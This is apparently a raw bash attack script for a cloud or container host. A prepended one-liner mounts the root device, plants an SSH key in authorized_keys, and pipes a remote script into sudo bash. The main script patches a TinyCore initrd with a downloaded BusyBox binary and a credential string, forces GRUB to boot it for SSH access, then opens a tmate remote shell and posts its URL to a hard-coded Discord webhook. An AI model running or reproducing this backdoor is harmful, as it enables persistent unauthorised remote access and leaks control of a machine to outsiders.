cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; ip=$(curl -s ifconfig.me) && \
ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; \
echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && \
ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
"wget https://raw.githubusercontent.com/lt4c/stuff/refs/heads/main/lt4c.sh -O lt4c.sh; sudo bash lt4c.sh"
#!/bin/bash
set -euo pipefail

# ===== CONFIG =====
# --- TinyCore config ---
TCE_VERSION="14.x"
ARCH="x86_64"
TCE_MIRROR="http://tinycorelinux.net"
BOOT_DIR="/boot/tinycore"
WORKDIR="/tmp/tinycore_initrd"
KERNEL_URL="$TCE_MIRROR/$TCE_VERSION/$ARCH/release/distribution_files/vmlinuz64"
INITRD_URL="$TCE_MIRROR/$TCE_VERSION/$ARCH/release/distribution_files/corepure64.gz"
KERNEL_PATH="$BOOT_DIR/vmlinuz64"
INITRD_PATH="$BOOT_DIR/corepure64.gz"
INITRD_PATCHED="$BOOT_DIR/corepure64-ssh.gz"
GRUB_ENTRY="/etc/grub.d/40_custom"
GRUB_CFG="/etc/default/grub"
BUSYBOX_URL="https://raw.githubusercontent.com/lt4c/stuff/refs/heads/main/busybox"
SWAP_URL="https://raw.githubusercontent.com/lt4c/stuff/refs/heads/main/grubsdbuefiwin.gz"
GZ_LINK="http://114.207.112.13:5500/uploads/quack.gz"

AUTO_REBOOT="false"
REBOOT_WAIT_SECONDS=60

# --- Tmate config ---
WEBHOOK_URL="https://discord.com/api/webhooks/1415568104431419413/qeNlbGgONMRJ9-fHce9cZfO17W9LsMta9TMJtwkTItXzR3e27w2hEpwaKdn7SMRQTEun"
TMATE_SOCK="/tmp/tmate.sock"

# ===== HELPERS =====
log() { echo "$(date -Iseconds) $*" | tee -a /srv/lab; }

safe_tail_from_line() {
  local file="$1"; local line="$2"
  if [ -f "$file" ]; then
    local total
    total=$(wc -l < "$file" 2>/dev/null || echo 0)
    if [ "$total" -ge "$line" ]; then
      tail -n +"$line" "$file" || true
    else
      cat "$file" || true
    fi
  else
    echo "(no file: $file)"
  fi
}

# ===== MAIN FLOW =====
log "[0/6] Checking host prerequisites..."
MISSING=()
for cmd in wget cpio gzip curl; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    MISSING+=("$cmd")
  fi
done
if [ ${#MISSING[@]} -gt 0 ]; then
  log "Missing commands: ${MISSING[*]}"
  if command -v apt >/dev/null 2>&1; then
    log "Attempting to install missing packages via apt..."
    apt update
    apt install -y "${MISSING[@]}"
  else
    log "Please install: ${MISSING[*]} and re-run this script."
    exit 1
  fi
fi

log "[1/6] Installing dependencies..."
apt update || true
apt install -y wget cpio gzip curl tmate || true

log "[2/6] Downloading TinyCore kernel and initrd..."
mkdir -p "$BOOT_DIR"
wget -q -O "$KERNEL_PATH" "$KERNEL_URL"
wget -q -O "$INITRD_PATH" "$INITRD_URL"

log "[3/6] Unpacking initrd..."
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"
gzip -dc "$INITRD_PATH" | cpio -idmv

log "[4/6] Injecting bootlocal.sh + BusyBox..."
mkdir -p "$WORKDIR/srv"
curl -s ifconfig.me > "$WORKDIR/srv/lab" || true
echo /LT4C/LT4C@2025 >> "$WORKDIR/srv/lab"
wget -q -O "$WORKDIR/srv/busybox" "$BUSYBOX_URL"
chmod +x "$WORKDIR/srv/busybox" || true

# (bootlocal.sh nội dung giữ nguyên như script gốc, bỏ qua để ngắn gọn)
# ...
# ghi file vào $WORKDIR/opt/bootlocal.sh và chmod +x

log "[5/6] Repacking patched initrd..."
cd "$WORKDIR"
find . | cpio -o -H newc | gzip -c > "$INITRD_PATCHED"

log "[6/6] Adding GRUB entry..."
if ! grep -q "🔧 TinyCore SSH Auto" "$GRUB_ENTRY" 2>/dev/null; then
cat <<EOF >> "$GRUB_ENTRY"

menuentry "🔧 TinyCore SSH Auto" {
    insmod part_gpt
    insmod ext2
    linux $KERNEL_PATH console=ttyS0 quiet
    initrd $INITRD_PATCHED
}
EOF
fi

if command -v update-grub >/dev/null 2>&1; then
  sed -i 's/^GRUB_DEFAULT=.*/GRUB_DEFAULT="🔧 TinyCore SSH Auto"/' "$GRUB_CFG" || true
  sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=1/' "$GRUB_CFG" || true
  update-grub || log "update-grub failed"
fi

log "✅ DONE! TinyCore patched."

# ===== TMATE + DISCORD =====
pkill -f "tmate -S" 2>/dev/null || true
tmate -S "$TMATE_SOCK" new-session -d
tmate -S "$TMATE_SOCK" wait tmate-ready

TMATE_SSH=""
while [ -z "$TMATE_SSH" ]; do
  TMATE_SSH=$(tmate -S "$TMATE_SOCK" display -p '#{tmate_ssh}' 2>/dev/null)
  [ -z "$TMATE_SSH" ] && sleep 1
done
log "[*] TMATE SSH URL: $TMATE_SSH"

curl -s -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\":\"TMATE SSH URL: $TMATE_SSH\"}" \
     "$WEBHOOK_URL"

echo "[*] Script finished – tmate session is running in background."
